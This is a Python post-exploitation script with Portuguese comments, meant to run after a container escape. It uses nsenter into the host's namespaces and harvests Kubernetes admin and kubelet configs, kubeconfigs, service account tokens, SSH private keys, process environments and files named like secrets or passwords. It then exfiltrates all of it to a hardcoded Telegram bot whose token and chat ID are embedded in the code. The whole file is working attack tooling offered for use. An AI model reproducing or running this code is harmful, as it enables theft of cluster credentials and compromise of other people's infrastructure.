#!/usr/bin/env python3
"""
Pós-escape: varredura aprofundada do host montado em /mnt.
"""

import subprocess
import json
import requests
import os
import re
import glob
from datetime import datetime

TELEGRAM_BOT_TOKEN = "8870734086:AAF_9CQIn-xO-5dd-npb4k_wvYs-QShmxi4"
TELEGRAM_CHAT_ID = "230885588"

def run(cmd, timeout=30):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout.strip() if result.returncode == 0 else f"ERRO: {result.stderr.strip()}"
    except Exception as e:
        return f"ERRO: {e}"

def run_nsenter(cmd):
    """Executa comando no namespace do host usando nsenter -t 1 -m -u -i -n -p"""
    full_cmd = f"nsenter -t 1 -m -u -i -n -p -- {cmd}"
    return run(full_cmd, timeout=30)

def send_telegram(text, parse_mode="Markdown"):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": parse_mode}, timeout=10)
    except:
        pass

def send_file(filename, caption=""):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    try:
        with open(filename, 'rb') as f:
            requests.post(url, files={'document': f}, data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption}, timeout=30)
    except:
        pass

def send_data(data_dict):
    for key, content in data_dict.items():
        if not content or content == "N/A" or content.startswith("ERRO"):
            continue
        if len(content) > 4000:
            tmp = f"/tmp/{key.replace('/','_')}.txt"
            with open(tmp, "w", encoding="utf-8", errors="ignore") as f:
                f.write(content)
            send_file(tmp, caption=f"📄 {key[:50]}")
            os.remove(tmp)
        else:
            send_telegram(f"📄 **{key}**\n```\n{content[:3000]}\n```")

def scan_files(base_dir, patterns, max_depth=6, max_size=100*1024):
    """
    Varre base_dir em busca de arquivos cujo nome corresponda a padrões regex.
    Retorna dicionário {caminho: conteúdo (limitado)}.
    """
    found = {}
    if not os.path.exists(base_dir):
        return found
    for root, dirs, files in os.walk(base_dir, topdown=True):
        depth = root.replace(base_dir, '').count(os.sep)
        if depth > max_depth:
            continue
        for file in files:
            full_path = os.path.join(root, file)
            for pattern, desc in patterns.items():
                if re.search(pattern, file, re.I):
                    try:
                        size = os.path.getsize(full_path)
                        if size > max_size:
                            content = f"[Arquivo muito grande: {size} bytes]"
                        else:
                            with open(full_path, 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read(max_size)
                        found[f"{desc} - {full_path}"] = content
                        break
                    except Exception as e:
                        found[f"{desc} - {full_path}"] = f"ERRO: {e}"
    return found

def collect_host_info():
    """Coleta informações gerais do host."""
    data = {}
    # Lista de diretórios interessantes para listar
    dirs_to_list = [
        "/mnt/etc/kubernetes",
        "/mnt/var/lib/kubelet",
        "/mnt/var/lib/docker/containers",
        "/mnt/var/lib/containerd",
        "/mnt/root/.kube",
        "/mnt/home/ubuntu/.kube",
        "/mnt/home/*/.kube",
        "/mnt/var/run/secrets/kubernetes.io/serviceaccount",
    ]
    for d in dirs_to_list:
        for path in glob.glob(d):
            if os.path.exists(path):
                ls = run(f"ls -la {path} 2>/dev/null")
                if ls and "ERRO" not in ls:
                    data[f"ls_{path}"] = ls

    # Tentar ler arquivos específicos
    specific_files = [
        "/mnt/etc/kubernetes/admin.conf",
        "/mnt/etc/kubernetes/kubelet.conf",
        "/mnt/var/lib/kubelet/config",
        "/mnt/root/.kube/config",
        "/mnt/home/ubuntu/.kube/config",
        "/mnt/var/run/secrets/kubernetes.io/serviceaccount/token",
        "/mnt/var/run/docker.sock",
        "/mnt/run/containerd/containerd.sock",
    ]
    for f in specific_files:
        if os.path.exists(f) and os.path.isfile(f):
            try:
                with open(f, 'r', errors='ignore') as fd:
                    content = fd.read(50000)
                data[f"file_{f.replace('/mnt','')}"] = content
            except Exception as e:
                data[f"file_{f}"] = f"ERRO: {e}"

    # Variáveis de ambiente do processo 1 do host
    env1 = run_nsenter("cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n'")
    if env1 and "ERRO" not in env1:
        data["proc_1_environ"] = env1

    # Processos em execução
    ps = run_nsenter("ps auxfww 2>/dev/null")
    if ps and "ERRO" not in ps:
        data["ps_auxfww"] = ps

    # Conexões de rede
    net = run_nsenter("netstat -tulpn 2>/dev/null || ss -tulpn 2>/dev/null")
    if net and "ERRO" not in net:
        data["netstat"] = net

    return data

def main():
    send_telegram("🔍 **Iniciando varredura aprofundada do host**")

    # 1. Coletar informações gerais
    host_info = collect_host_info()
    send_data(host_info)

    # 2. Buscar arquivos com padrões de segredo
    patterns = {
        r".*\.pem$|.*\.crt$|.*\.key$": "Cert/Key",
        r".*token.*": "Token",
        r".*\.kube/config$": "Kubeconfig",
        r".*id_rsa$|.*id_dsa$": "SSH private",
        r".*secret.*": "Secret",
        r".*password.*": "Password",
        r".*credential.*": "Credential",
        r".*\.conf$|.*\.yaml$|.*\.yml$": "Config file"
    }
    # Limitar a diretórios específicos para não sobrecarregar
    search_dirs = ["/mnt/etc", "/mnt/var", "/mnt/root", "/mnt/home", "/mnt/run"]
    found_files = {}
    for base in search_dirs:
        if os.path.exists(base):
            found = scan_files(base, patterns, max_depth=5, max_size=200*1024)
            found_files.update(found)
    if found_files:
        send_data(found_files)
    else:
        send_telegram("❌ Nenhum arquivo sensível encontrado na busca.")

    # 3. Listar containers (via docker/containerd)
    docker_ps = run_nsenter("docker ps -a 2>/dev/null")
    if docker_ps and "ERRO" not in docker_ps:
        send_data({"docker_ps": docker_ps})
    crictl_ps = run_nsenter("crictl ps -a 2>/dev/null")
    if crictl_ps and "ERRO" not in crictl_ps:
        send_data({"crictl_ps": crictl_ps})

    # 4. Tenta ler logs de pods (caso existam)
    pod_logs = run_nsenter("ls -la /var/log/pods/ 2>/dev/null | head -20")
    if pod_logs and "ERRO" not in pod_logs:
        send_data({"var_log_pods": pod_logs})

    # 5. Tenta executar kubectl se disponível
    kubectl_version = run_nsenter("kubectl version --client 2>/dev/null")
    if kubectl_version and "ERRO" not in kubectl_version:
        # Tenta listar nodes (pode falhar se não tiver credenciais)
        nodes = run_nsenter("kubectl get nodes 2>/dev/null")
        if nodes and "ERRO" not in nodes:
            send_data({"kubectl_get_nodes": nodes})
        pods = run_nsenter("kubectl get pods --all-namespaces 2>/dev/null")
        if pods and "ERRO" not in pods:
            send_data({"kubectl_get_pods": pods})

    send_telegram("✅ **Varredura finalizada.**")

if __name__ == "__main__":
    main()
